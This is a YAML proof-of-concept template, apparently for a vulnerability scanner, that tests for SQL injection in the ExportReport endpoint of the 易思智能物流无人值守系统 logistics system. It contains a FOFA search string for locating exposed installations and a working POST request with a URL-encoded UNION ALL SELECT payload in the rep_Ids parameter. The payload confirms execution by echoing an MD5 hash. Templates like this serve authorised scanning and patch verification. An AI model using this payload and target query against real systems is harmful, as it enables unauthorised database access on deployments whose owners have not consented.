id: poc-yaml-eosine-exportreport-sqli
info:
  name: 易思智能物流无人值守系统 ExportReport SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 易思智能物流无人值守系统
  fofa: body="/api/SingleLogin"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
requests:
- method: POST
  path: /Sys_ReportFile/ExportReport
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: rep_Ids=1%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2Csys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+CdNX
  expression: status_code == 200 && contains(body,"0x"+ t2) && contains(body,"转换成数据类型")
    && contains(body,"resultdata")
transport: http
